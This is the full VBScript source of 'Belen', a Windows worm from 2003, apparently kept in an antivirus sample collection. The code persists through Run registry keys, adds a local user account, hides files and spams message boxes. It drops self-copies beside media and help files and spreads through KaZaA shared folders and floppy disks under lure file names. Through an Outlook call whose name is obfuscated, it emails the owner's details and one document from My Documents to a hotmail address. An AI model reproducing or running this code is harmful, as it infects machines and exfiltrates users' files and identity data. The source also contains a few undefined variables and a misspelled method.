' Symantec ScriptBlocking Authenticated File
' 59BA9737-A16D-4256-96F1-29FF4870D09E

rem BOF Belen.vbs
rem < I-Worm.Belen.VBS, Belen.Worm/VBS                                               >
rem < Made in Tulpetlac - Santa Clara - San Pedro, Edo Mex., Mexico                  >
option explicit
on error resume next
rem <Declarations>
const MY_SELF = "W32.Belen.Worm/VBS"
const MACHIN = "HKEY_LOCAL_MACHINE\"
const UZER = "HKEY_CURRENT_USER\"
const MINE = "HKEY_LOCAL_MACHINE\Software\Burbuja\Belen\"
dim e1,e2,e3,e4
e1 = "WAV"
e2 = "HLP"
e3 = "HTM"
e4 = "BMP"
rem <Install>
dim fiHand,sf,wf,loc,bo,w
set fiHand = createObject("Scripting.fileSystemObject")
set loc = fiHand.getFile(WScript.ScriptFullName)
set w = fiHand.opentextFile(loc,1)
bo = w.readAll
set sf = fiHand.getspecialFolder(1)
set wf = fihand.getSpecialFolder(0)
dim WSH, lr, er
set WSH = createObject("WScript.Shell")
lr = WSH.regread (MINE & "Installed")
if lr <> "YES" then
	dim h, cop, llav, valo, infOrg, infOwn
	dim flac: flac = "win"
	dim ff
	ff = "\" & flac & ".vbs"
	set belen = fihand.createtextfile(sf&ff)
	belen.writeline("rem")
	belen.writeline("do")
	belen.writeline("msgbox(" & chr(34) & MY_SELF & chr(34) & "),vbSystemModal")
	belen.writeline("loop")
	belen.writeline("rem that's very funny")
	belen.close
	dim funny
	randomize timer
	funny = int(rnd * 10)
	select case funny
		case 2,4,6,8,0
		WSH.regWrite MACHIN & "Software\Microsoft\Windows\CurrentVersion\Run\Windows",sf&ff
		WSH.run sf & "win.vbs"
	end select
	infOrg = WSH.regread (MACHIN & "Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
	infOwn = WSH.regRead (MACHIN & "Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
	randomize timer
	h = int(rnd * 5)
	select case h
	case 0,1
		cop = "\WSH32.vbs"
		llav = "Windows Script Hosting"
	case 2
		cop = "\Win32.vbs"
		llav = "Windows Default Loader"
	case 3
		cop = "\ms32.vbs"
		llav = "Microsoft"
	case 4
		cop = "\Agent.vbs"
		llav = "Microsoft Agent"
	case 5
		cop = "\kernel.vbs"
		llav = "Windows Kernel"
	end select
	valo = cop
	dim n
	set n = fiHand.createTextFile(sf & cop)
	n.write bo
	n.close
	dim este
	set este= fihand.getfile(sf&cop)
	este.copy(sf & "\rundll32.vbs")
	WSH.regWrite MACHIN & "Software\Microsoft\Windows\CurrentVersion\Run\" & llav, sf & valo
	WSH.regWrite MINE & "Installed", "YES"
	WSH.regWrite MINE & "InfectedOrg", infOrg
	WSH.regWrite MINE & "InfectedOwn", infOwn
	WSH.regWrite MINE & "Flag", ff
	WSH.regWrite MACHIN & "Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Burbuja"
	WSH.regWrite MACHIN & "Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","Mocosof_Guindows"
	msgbox("El archivo no está completo, reemplacelo por una copia nueva"),vbCritical, "Windows - Error del Sistema"
        WSH.rUn("net user Belen Belen /add")
else
	msgbox("Windows no puede leer la unidad A:, compruebe que inserto un disco"),vbCritical, "Windows - Error del sistema"
end if
rem <Infect files>
dim fol, ar, q, eName, se, es
set fol = fiHand.getFolder(sf)
set ar = fol.files
for each q in ar
	eName = fiHand.GetExtensionName(q.path)
	eName = ucase(eName)
	if (eName = e1 or eName = e2 or eName = e3 or eName = e4) then
		set se = fiHand.CreateTextFile(q.path & ".vbs",2,false)
		se.write bo
		se.close
	end if
	es = fiHand.getFile(q.path)
	es.attributes = 2 + 4
next
set fol = fiHand.getFolder(wf)
set ar = fol.files
for each q in ar
	eName = fiHand.GetExtensionName(q.path)
	eName = ucase(eName)
	if (eName = e1 or eName = e2 or eName = e3 or eName = e4) then
		set se = fiHand.CreateTextFile(q.path & ".vbs",2,false)
		se.write bo
		se.close
	end if
	es = fiHand.getFile(q.path)
	es.attributes = 2 + 4
next
loc.copy(sf & att1)
loc.copy(sf & att2)
loc.copy(sf & att3)
loc.copy(sf & att4)
loc.copy(sf & att5)
rem <spread to kazaa>
dim pfd
pfd = WSH.regread (MACHIN & "Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if pfd = "" then
	pfd = "c:\Archivos de Programa"
end if
dim k, z
k = "\KaZaA\My Shared folder\"
z = "\KaZaA Lite\My Shared Folder\"
loc.copy(pfd & k & "winzip81.exe.vbs")
loc.copy(pfd & z & "winzip81.exe.vbs")
loc.copy(pfd & k & "AntiMapson.vbs")
loc.copy(pfd & z & "AntiMapson.vbs")
loc.copy(pfd & k & "Folladas con Britney.mpeg.vbs")
loc.copy(pfd & z & "Folladas con Britney.mpeg.vbs")
loc.copy(pfd & k & "Air Supply - Even the nights are better.mp3.vbs")
loc.copy(pfd & z & "Air Supply - Even the nights are better.mp3.vbs")
loc.copy(pfd & k & "Asereje.mp3.vbs")
loc.copy(pfd & z & "Asereje.mp3.vbs")
loc.copy(pfd & k & "Avril Lavigne - Complicated.mp3.vbs")
loc.copy(pfd & z & "Avril Lavigne - Complicated.mp3.vbs")
loc.copy(pfd & k & "Infected Mushroom feat Space Cat - Mushroom on the space.mp3.vbs")
loc.copy(pfd & z & "Infected Mushroom feat Space Cat - Mushroom on the space.mp3.vbs")
loc.copy(pfd & k & "Mapson Remover.vbs")
loc.copy(pfd & z & "Mapson Remover.vbs")
loc.copy(pfd & k & "Mapson Cleaner Full.vbs")
loc.copy(pfd & z & "Mapson Cleaner Full.vbs")
loc.copy(pfd & k & "Lorraine Remover.vbs")
loc.copy(pfd & z & "Lorraine Remover.vbs")
loc.copy(pfd & k & "AntiLorraine.vbs")
loc.copy(pfd & z & "Antilorraine.vbs")
loc.copy(pfd & k & "Lorraine Cleaner.vbs")
loc.copy(pfd & z & "Lorraine Cleaner.vbs")
rem <disclaimer>
dim j
set j = fiHand.CreateTextFile("c:\Belen.txt",2,false)
j.write("Virus Name: " & MY_SELF & vbcrlf)
j.write("Author: Burbuja" & vbcrlf)
j.write("Type: E-Mail and P2P.Kazaa Worm" & vbcrlf)
j.write("Dedicated to: All my friends :)" & vbcrlf)
j.write("Destructive: NO" & vbcrlf)
j.write("Purpose: Educational Only" & vbcrlf)
j.write("Language: Microsoft Visual Basic Scripting Edition" & vbcrlf)
j.write("<--------------------------------->" & vbcrlf)
j.write("Nombre del Virus: " & MY_SELF & vbcrlf)
j.write("Autor: Burbuja" & vbcrlf)
j.write("Tipo: Gusano de E-Mail y P2P.Kazaa" & vbcrlf)
j.write("Dedicado a: Todos mis amigos :)" & vbcrlf)
j.write("Destructivo: NO" & vbcrlf)
j.write("Proposito: Solo Educacional" & vbcrlf)
j.write("Lenguaje: Microsoft Visual Basic Scripting Edition" & vbcrlf)
j.write("<---------------------------------->" & vbcrlf)
j.write("(c) Mexico 2003 - belem__@hotmail.com -" & vbcrlf)
j.write("Tulpetlac - Santa Clara - San Pedro" & vbcrlf)
j.write("GigaByte, exelente coder, de las mejores del mundo" & vbcrlf)
j.write("3 años de carcel, es de no creerse" & vbcrlf)
j.write("¿Por que encerrar el talento coder en una prision?" & vbcrlf)
j.write("GigaByte, all c0d3rS in the world are with you!! -Coding RULZ!" & vbcrlf)
j.write(MY_SELF)
j.close
WSH.regwrite MACHIN & "Software\Microsoft\Windows\CurrentVersion\Run\Disclaimer",wf &"\notepad.exe c:\Belen.txt"
WSH.regwrite UZER & "Software\Microsoft\Internet Explorer\Main\Start Page","http://www.iztapalapa.df.gob.mx"
WScript.Sleep 15000
loc.copy("a:\juegos en linea.vbs")
loc.copy("a:\www.Horoscopo Personal.com.vbs")
loc.copy("a:\Estas Tetas me gustan.gif.vbs")
rem <take files>
dim md2,fi,x
set md2 = WSH.SpecialFolders("MyDocuments")
dim md, who1, who2
set md = fiHand.GetFolfer(md2)
set fi = md.files
who1 = WSH.regread (MINE & "InfectedOwn")
who2 = WSH.regread (MINE & "InfectedOrg")
x=0
for each fi in md
	x = x + 1
next
dim s
randomize timer
s= int(rnd * x)
if s = 0 then s = 1
x = 0
for each fi in md
	x= x + 1
	if x = s then
		dim qq
		set qq = fiHand.getfile(fi.path)
	end if
next		
dim ou, en
set ou = WScript.CreateObject (chr(99-20) & chr(115+2) & chr(100+16) & chr(110-2) & chr(111) & chr(120-9) & chr(77+30) & chr(106-70+10) & chr(5+60) & chr(112) & chr(80+32) & chr(88+20) & chr(115-10) & chr(199-100) & chr(97+0) & chr(136-20) & chr(95+10) & chr(141-30) & chr(109+1))
set en = ou.CreateItem(0)
en.Recipients.Add("chely__ma@hotmail.com")
en.Subject=(MY_SELF & " informa y envia")
en.Body=("Organizacion: " & who2 & vbcrlf & "Propietario: " & who1)
en.Attachments.Add(q.path)
en.send
msgbox("Inserte un disco en la unidad A:"),vbInformation, "Windows"

rem EOF Belen.vbs
